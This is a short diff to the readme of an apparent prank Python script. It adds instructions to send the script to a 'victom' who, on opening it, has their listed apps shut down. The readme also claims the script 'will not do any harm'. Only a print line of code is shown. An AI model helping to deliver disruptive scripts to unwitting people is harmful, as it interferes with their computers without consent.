@@ -1,12 +1,16 @@
 Hello, This script is made by melon#3397
 
 This is a simple script that shuts down apps,
-it will not do any harm
+it will not do any harm.
 
 Feel free to modify it in any way 
 add as many apps as you want c:
 
-source code:
+HOW TO USE: Just past this in your editor, save it as a .py send it to your victom and when they open it, it will show down all the listed apps c: 
+
+*Note you must have python installed.
+
+source code (copy past):
 
 
 print ("Did you really just trust me?")
